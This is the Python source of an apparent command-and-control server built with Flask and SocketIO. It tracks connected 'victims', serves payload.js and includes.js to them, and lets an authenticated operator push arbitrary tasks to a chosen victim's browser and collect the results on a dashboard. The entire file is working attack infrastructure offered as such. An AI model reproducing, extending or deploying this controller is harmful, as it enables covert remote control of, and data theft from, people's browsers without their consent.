#!/usr/bin/env python

async_mode = None

from flask import Flask, render_template, session, request, Response, abort, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room, close_room, rooms, disconnect
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_required, login_user, logout_user, current_user
from flask_bcrypt import Bcrypt
import sqlite3, functools, random, string, datetime


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
DATABASE = 'tasks.db'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
socketio = SocketIO(app)
bcrypt = Bcrypt(app)

class User(db.Model):

    __tablename__ = 'user'

    username = db.Column(db.String, primary_key=True)
    password = db.Column(db.String)
    authenticated = db.Column(db.Boolean, default=False)

    def is_active(self):
        """True, as all users are active."""
        return True

    def get_id(self):
        """Return the email address to satisfy Flask-Login's requirements."""
        return self.username

    def is_authenticated(self):
        """Return True if the user is authenticated."""
        return self.authenticated

    def is_anonymous(self):
        """False, as anonymous users aren't supported."""
        return False


class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=False)
    victim_id = db.Column(db.Text, db.ForeignKey('victim.id'), primary_key=True)
    input = db.Column(db.Text)
    output = db.Column(db.Text)
    status = db.Column(db.Text)
    created_time = db.Column(db.DateTime)
    victim = db.relationship('Victim',
        backref=db.backref('tasks', lazy='dynamic'))
    def __init__(self, victim, id,  input, output=None):
        self.id = id
        self.victim = victim
        self.input = input
        self.output = output
        self.status= "new"
        self.created_time = datetime.datetime.utcnow()
    def __repr__(self):
        return '<Task %r>' % self.id
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result

class Victim(db.Model):
    id = db.Column(db.Text, primary_key=True, autoincrement=False)
    active = db.Column(db.Boolean)
    created_time = db.Column(db.DateTime)
    def __init__(self, id):
        self.id=id
        self.created_time = datetime.datetime.utcnow()
        self.active=True
    def __repr__(self):
        return '<Client %r>' % self.id 
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result


db.drop_all()
db.create_all()

#testing
tmpuser = User()
tmpuser.username="admin"
pw = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
print "Username: "+tmpuser.username
print "Password: "+pw

tmpuser.password=bcrypt.generate_password_hash(pw)
db.session.add(tmpuser)
db.session.commit()

@login_manager.user_loader
def user_loader(user_id):
    """Given *user_id*, return the associated User object.

    :param unicode user_id: user_id (email) user to retrieve
    """
    return User.query.get(user_id)


@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route("/login", methods=["GET", "POST"])
def login():
    """For GET requests, display the login form. For POSTS, login the current user
    by processing the form."""
    if request.method == 'POST':
        user = User.query.get(request.form['username'])
        if user:
            if bcrypt.check_password_hash(user.password, request.form['password']):
                user.authenticated = True
                db.session.add(user)
                db.session.commit()
                login_user(user, remember=False)
                return redirect(url_for("dashboard"))
    return render_template('login.html')
    
@app.route("/logout")
@login_required
def logout():
    """Logout the current user."""
    user = current_user
    user.authenticated = False
    db.session.add(user)
    db.session.commit()
    logout_user()
    return render_template("login.html")


@login_manager.unauthorized_handler
def unauthorized_callback():
    return redirect('/login')

def authenticated_only(f):
    @functools.wraps(f)
    def wrapped(*args, **kwargs):
        if not current_user.is_authenticated:
            disconnect()
        else:
            return f(*args, **kwargs)
    return wrapped

@app.route('/payload.js')
def payloadjs():
    return open('payload.js').read()
@app.route('/includes.js')
def includesjs():
    return open('includes.js').read()
    
@socketio.on('task add', namespace='/dashboard')
@authenticated_only
def add_task(message): 
    victim = Victim.query.filter_by(id=message['victim']).first()
    max_id = Task.query.filter_by(victim = victim).order_by(Task.id.desc()).limit(1).all()
    myid=0
    if len(max_id) == 0:
        myid = 1
    else:
        myid=max_id[0].id+1
    task = Task(victim,myid,message['input'])
    db.session.add(task)
    db.session.commit()
    socketio.emit('issue task',
                      {'id':task.id,'input':task.input},
                      namespace='/victim', room=victim.id)
    socketio.emit('issue task',
                      {'victim':victim.id,'id':task.id,'input':task.input},
                      namespace='/dashboard',include_self=False)
    socketio.emit('issue task self',
                      {'victim':victim.id,'id':task.id,'input':task.input},
                      namespace='/dashboard', room=request.sid)  
    print('[*] Task added: '+str(task.id))

@socketio.on('task output', namespace='/victim')
def task_output(message):
     victim = Victim.query.filter_by(id=request.sid).first()
     task = Task.query.filter_by(victim=victim,id=message['id']).first()
     if (task.output == None):
         task.output = str(message['output'])
     else:
         task.output=str(task.output)+'\n\n'+str(message['output'])
     db.session.commit()
     socketio.emit('task output',
                      {'victim':victim.id,'id':task.id,'output':task.output},
                      namespace='/dashboard')

@socketio.on('connect', namespace='/dashboard')
@authenticated_only
def dash_connect():
    outputlist = []
    victims = Victim.query.all()
    for victim in victims:
        tasklist = []
        tasks=Task.query.filter_by(victim=victim).all()
        for task in tasks:
            tasklist.append({'id':task.id,'input':task.input,'output':task.output})
        outputlist.append({'id':victim.id,'active':victim.active,'tasks':tasklist})
    emit('datadump', {'data': outputlist})
    print('[*] User connected: '+request.sid)
    
@socketio.on('connect', namespace='/victim')
def victim_connect():
    myvictim = Victim(request.sid)
    db.session.add(myvictim)
    db.session.commit()
    print('[*] Victim connected: '+myvictim.id)
    socketio.emit('victim connect',
                      {'id':myvictim.id,'active':myvictim.active},
                      namespace='/dashboard')

@socketio.on('disconnect', namespace='/dashboard')
@authenticated_only
def dash_disconnect():
    print('[*] User disconnected: '+request.sid)
    
@socketio.on('disconnect', namespace='/victim')
def victim_disconnect():
    myvictim = Victim.query.filter_by(id=request.sid).first()
    myvictim.active=False
    db.session.commit()
    socketio.emit('victim disconnect',
                      {'id':request.sid},
                      namespace='/dashboard')
    print('[*] Victim disconnected: '+request.sid)
    
if __name__ == '__main__':
    socketio.run(app)


